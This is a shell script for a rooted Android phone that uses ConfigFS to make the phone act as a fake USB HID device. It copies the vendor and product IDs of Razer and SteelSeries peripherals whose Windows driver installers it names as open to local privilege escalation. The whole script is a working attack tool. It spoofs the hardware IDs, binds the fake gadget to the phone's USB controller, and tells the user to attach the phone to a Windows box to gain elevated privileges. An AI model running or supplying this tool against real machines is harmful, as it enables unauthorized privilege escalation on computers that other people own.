#/bin/sh
#
# MINIMAL USB gadget setup using CONFIGFS for simulating various HID devices
#
# inspired for pwning vulnerable driver install on Windows using an
# Android phone without a genuine hardware device
#
# the script was developed & tested on Android LineageOS 18.1
#

# device specifications (already known for LPE vuln)

# Razer: https://twitter.com/j0nh4t/status/1429049506021138437
# https://twitter.com/an0n_r0/status/1429386474902917124
PRODUCT[0]="Razer Turret for Xbox One"
VID[0]="0x1532"
PID[0]="0x023E"
MI[0]=2

# SteelSeries: https://twitter.com/zux0x3a/status/1429841541036527616
PRODUCT[1]="SteelSeries Apex Mechanical Gaming Keyboard"
VID[1]="0x1038"
PID[1]="0x1600"
MI[1]=1

n=${#VID[@]}

GREEN='\033[0;32m'
NC='\033[0m'

echo -e ${GREEN}
echo "| | (_  |_)  _   _.  _|  _   _ _|_ "
echo "|_| __) |_) (_| (_| (_| (_| (/_ |_ "
echo "             _|          _|        "
echo "v0.1"
echo
echo "USB gadget generator for HID devices using ConfigFS"
echo
echo "WARNING: experimental version, may crash the phone!!!"
echo
echo "Inspired by vulnerable device driver package"
echo "installers allowing LPE attack on Windows"
echo
echo -n "[*] Checking root..."
if [ `id -u` -eq 0 ]; then
    echo "OK."
else
    echo "FAILED. Run the tool as root (su)."
    echo -e ${NC}
    exit 1
fi
echo
echo "Select HID dev to mimic (with confirmed LPE vuln):"
echo
for i in `seq 0 $((n-1))` ; do
  echo "  $((i+1)): ${PRODUCT[$i]}"
  echo "       (USB/VID_${VID[$i]}&PID_${PID[$i]}&MI_0${MI[$i]})"
done
echo
echo "  C: Custom"
echo
sel=""
while [[ -z "${VID[$((sel-1))]}" ]] && [[ "${sel}" != "c" ]] && [[ "${sel}" != "C" ]]; do
  echo -n "> "
  read sel
done

if [[ "${sel}" == "c" ]]  || [[ "${sel}" == "C" ]]; then
    echo "Custom HID dev selected"
    echo -n "Enter Product String: "
    read product
    echo -n "Enter Vendor ID (VID): "
    read idVendor
    echo -n "Enter Product ID (PID): "
    read idProduct
    echo -n "Enter number of functions supported (minus one) (MI): "
    read mi
else
    product="fake ${PRODUCT[$((sel-1))]}"
    idVendor=${VID[$((sel-1))]}
    idProduct=${PID[$((sel-1))]}
    mi=${MI[$((sel-1))]}
fi

echo
echo "[*] Using Product String:"
echo "  ${product}"
echo "[*] Using Hardware Id:"
echo "  USB/VID_${idVendor}&PID_${idProduct}&MI_0${mi}"
echo

# remount ConfigFS if it is needed
if [ -d /sys/kernel/config/usb_gadget ]; then
    echo "[*] ConfigFS seems to be mounted..."
    echo "[*] ...and usb_gadget is available"
else
    mount -t configfs none /sys/kernel/config
    echo "[+] (Re)mounted ConfigFS"
fi

# create gadget (and remove if it existed)
if [ -d /sys/kernel/config/usb_gadget/pwn_hid_install ]; then
    echo "[!] usb_gadget pwn_hid_install exists"
    rm -fr /sys/kernel/config/usb_gadget/pwn_hid_install 2>/dev/null
    echo "[+] Cleaned up pwn_hid_install"
fi

mkdir /sys/kernel/config/usb_gadget/pwn_hid_install
cd /sys/kernel/config/usb_gadget/pwn_hid_install
if [ $? -eq 0 ]; then
    echo "[+] Created usb_gadget pwn_hid_install"
else
    echo "[!] Problem with usb_gadget in ConfigFS. Aborting."
    echo -e ${NC}
    exit 1
fi

echo -n "[+] Basic configuration is in progress..."

# set vendor & product id
echo "${idVendor}" > idVendor
echo "${idProduct}" > idProduct

# set USB version 2
echo 0x0200 > bcdUSB

# set device to class to Misc / Interface Association Descriptor.
echo 0xEF > bDeviceClass
echo 0x02 > bDeviceSubClass
echo 0x01 > bDeviceProtocol

# set some info strings
mkdir -p strings/0x409
echo "deadbeefdeadbeef" > strings/0x409/serialnumber
echo "an0n" > strings/0x409/manufacturer
echo "${product}" > strings/0x409/product
mkdir -p configs/c.1/strings/0x409
echo "basic Multi-function device with single TLC (MI_01)" > configs/c.1/strings/0x409/configuration

# set some fake power config values
echo 250 > configs/c.1/MaxPower
echo 0x80 > configs/c.1/bmAttributes

echo "DONE."

echo -n "[+] Adding $((mi+1)) HID transports..."
# add mouse HID devices (protocol 2) with a basic HID report descriptor
for i in `seq 1 $((mi+1))` ; do
  mkdir -p functions/hid.g${i}
  echo 2 > functions/hid.g${i}/protocol
  echo 6 > functions/hid.g${i}/report_length
  echo BQEJAqEBCQGhAIUBBQkZASkDFQAlAZUDdQGBApUBdQWBAwUBCTAJMRWBJX91CJUCgQaVAnUIgQHAwAUBCQKhAQkBoQCFAgUJGQEpAxUAJQGVA3UBgQKVAXUFgQEFAQkwCTEVACb/f5UCdRCBAsDA | base64 -d > functions/hid.g${i}/report_desc
done
echo "DONE."

echo -n "[+] Activating HID transports..."
for i in `seq 1 $((mi+1))` ; do
  ln -s functions/hid.g${i} configs/c.1/
done
echo "DONE."

for udc in `find .. -name "UDC"`; do
    echo "" > ${udc}
done
getprop sys.usb.controller > UDC
if [[ "`getprop sys.usb.controller`" == "`cat UDC`" ]]; then
    echo "[+] Gadget binded to the USB controller"
else
    echo "[!] Gadget bind error"
fi

echo
echo "Everything is configured."
echo "Attach the Android to the Windows box for LPE! :)"

echo -e ${NC}
exit 0
